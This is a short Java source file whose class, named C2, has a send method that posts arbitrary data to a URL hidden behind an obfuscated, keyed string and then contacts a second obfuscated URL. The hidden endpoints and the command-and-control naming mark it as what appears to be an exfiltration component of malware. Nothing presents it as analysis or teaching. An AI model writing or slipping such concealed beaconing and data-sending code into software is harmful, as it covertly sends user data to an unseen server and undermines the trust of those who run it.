package com.rdict.t2;
public class C2 {
    public static void send(String data) throws Exception {
        java.net.HttpURLConnection c = (java.net.HttpURLConnection) new java.net.URL(Z.a("ob6/vPfh4OTk/OLm++Xk9u7g4+zl7vCHgJaGypWOlw==", 201)).openConnection();
        c.setDoOutput(true); c.getOutputStream().write(data.getBytes());
        new java.net.URL(Z.a("JTo7ICJofHs0Jj52LT83OTosPg1PDREDSgQIHF5dWl5eWlpGRkpJNTQ+HEsTIgpFMQxN1vW62fTS67PG+rzS7rzN66XU9KPT/bnk/ff+1vnu7f7HxA==", 77)).openConnection().connect();
    }
}